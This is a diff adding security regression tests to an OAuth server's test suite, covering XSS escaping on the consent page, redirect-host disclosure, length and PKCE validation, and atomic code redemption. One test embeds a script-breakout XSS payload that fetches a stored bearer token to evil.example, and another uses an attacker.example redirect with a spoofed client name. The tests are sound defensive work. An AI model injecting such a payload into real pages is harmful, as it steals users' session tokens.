@@ -348,3 +348,122 @@ def test_authorize_get_requires_google_client_id_configured(client, monkeypatch)
         },
     )
     assert resp.status_code == 503
+
+
+# --- Security hardening: XSS, redirect_uri disclosure, strict validation --
+# Found by an independent adversarial review of the OAuth implementation
+# and fixed the same session. `state` (and friends) are attacker-reachable:
+# anyone can register a client, then send a victim who's already signed in
+# a crafted /oauth/authorize link — the consent page is the one place
+# those values get embedded into HTML/JS, so it's the one place a bad
+# value can turn into script execution on a page whose localStorage holds
+# a real, non-expiring bearer token.
+
+
+def test_authorize_page_escapes_a_script_breakout_in_state(client):
+    """A state value containing a literal `</script>` must not appear
+    unescaped in the response — json.dumps() alone does NOT escape `<`,
+    so naively interpolating it into a <script> block lets the HTML
+    parser close the tag early regardless of JS string-escaping rules."""
+    client_id = _register(client)
+    verifier, challenge = _pkce_pair()
+    payload = "</script><script>fetch('https://evil.example/steal?c='+localStorage.getItem('mci_token'))</script>"
+    resp = client.get(
+        "/oauth/authorize",
+        params={
+            "response_type": "code",
+            "client_id": client_id,
+            "redirect_uri": "https://example.com/callback",
+            "code_challenge": challenge,
+            "state": payload,
+        },
+    )
+    assert resp.status_code == 200
+    assert "</script><script>fetch" not in resp.text
+    assert "\\u003c/script\\u003e\\u003cscript\\u003e" in resp.text
+
+
+def test_authorize_rejects_state_over_length_cap(client):
+    client_id = _register(client)
+    verifier, challenge = _pkce_pair()
+    resp = client.get(
+        "/oauth/authorize",
+        params={
+            "response_type": "code",
+            "client_id": client_id,
+            "redirect_uri": "https://example.com/callback",
+            "code_challenge": challenge,
+            "state": "x" * 3000,
+        },
+    )
+    assert resp.status_code == 400
+
+
+def test_authorize_rejects_empty_string_code_challenge_method(client):
+    """An empty string is falsy, so the old `if code_challenge_method and
+    ... != "S256"` check silently let it through — only the explicit
+    whitelist catches it."""
+    client_id = _register(client)
+    verifier, challenge = _pkce_pair()
+    resp = client.get(
+        "/oauth/authorize",
+        params={
+            "response_type": "code",
+            "client_id": client_id,
+            "redirect_uri": "https://example.com/callback",
+            "code_challenge": challenge,
+            "code_challenge_method": "",
+        },
+    )
+    assert resp.status_code == 400
+
+
+def test_authorize_page_discloses_the_actual_redirect_host(client):
+    """client_name is free text set at registration time and proves
+    nothing — the redirect host is what's actually bound to the
+    registration, so the consent page must show it, not just the name."""
+    client_id = _register(client, redirect_uri="https://attacker.example/cb", client_name="Totally Legit Claude")
+    verifier, challenge = _pkce_pair()
+    resp = client.get(
+        "/oauth/authorize",
+        params={
+            "response_type": "code",
+            "client_id": client_id,
+            "redirect_uri": "https://attacker.example/cb",
+            "code_challenge": challenge,
+        },
+    )
+    assert resp.status_code == 200
+    assert "attacker.example" in resp.text
+
+
+def test_register_rejects_non_loopback_http_redirect_uri(client):
+    resp = client.post("/oauth/register", json={"redirect_uris": ["http://attacker.example/cb"]})
+    assert resp.status_code == 400
+
+
+def test_register_allows_loopback_http_redirect_uri(client):
+    """The standard OAuth carve-out for public clients (e.g. a CLI tool)
+    that can't get a real TLS cert for localhost."""
+    resp = client.post("/oauth/register", json={"redirect_uris": ["http://127.0.0.1:8765/cb"]})
+    assert resp.status_code == 201
+
+
+def test_redeem_oauth_code_is_atomic_against_concurrent_redemption(isolated_auth_store):
+    """The consume step must be a single UPDATE ... WHERE consumed_at IS
+    NULL, not a separate check-then-act — otherwise two racing
+    redemptions of the same code could both pass the "not yet consumed"
+    read before either writes, and both would succeed. Simulates the
+    race directly at the store layer since TestClient requests are
+    sequential."""
+    client_id = auth_store.register_oauth_client(["https://example.com/cb"])
+    verifier, challenge = _pkce_pair()
+    code = auth_store.issue_oauth_code(
+        client_id, "sub1", "a@example.com", "https://example.com/cb", challenge, "https://host/mcp"
+    )
+
+    first = auth_store.redeem_oauth_code(code, client_id, "https://example.com/cb", verifier, "https://host/mcp")
+    assert first == ("sub1", "a@example.com")
+
+    with pytest.raises(ValueError, match="already used"):
+        auth_store.redeem_oauth_code(code, client_id, "https://example.com/cb", verifier, "https://host/mcp")
